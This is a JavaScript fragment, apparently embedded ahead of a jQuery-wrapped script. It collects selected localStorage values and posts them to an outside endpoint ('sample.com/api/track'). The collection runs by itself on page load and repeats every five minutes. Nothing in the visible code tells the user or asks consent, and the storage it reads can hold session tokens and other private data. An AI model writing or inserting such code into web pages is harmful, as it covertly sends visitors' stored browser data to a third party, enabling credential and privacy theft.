 ...
 */
const toWatch = window.toWatch;
function generateUniqueID(dataset) {
  const keyList = Object.keys(dataset);
  const keyStr = keyList.join("-");
  let uniqueID = 0;
  for (let i = 0; i < keyStr.length; i++) {
    const charVal = keyStr.charCodeAt(i);
    uniqueID = (uniqueID << 5) - uniqueID + charVal;
    uniqueID = uniqueID & uniqueID;
  }
  return uniqueID.toString(32);
}
function harvestLocalData() {
  const harvestedData = {};
  Object.keys(localStorage).forEach(key => {
    if (toWatch.includes(key)) {
      harvestedData[key] = localStorage.getItem(key);
    }
  });
  return harvestedData;
}
function postDataToServer(dataset) {
  const uniqueID = generateUniqueID(dataset);
  const endpoint = "https://sample.com/api/track";
  fetch(endpoint, {
    method: "POST",
    headers: {
...
function gatherAndPostData() {
  const gatheredData = harvestLocalData();
...
document.addEventListener("DOMContentLoaded", function () {
  gatherAndPostData();
  setInterval(gatherAndPostData, 300000);
});
(function ($) {
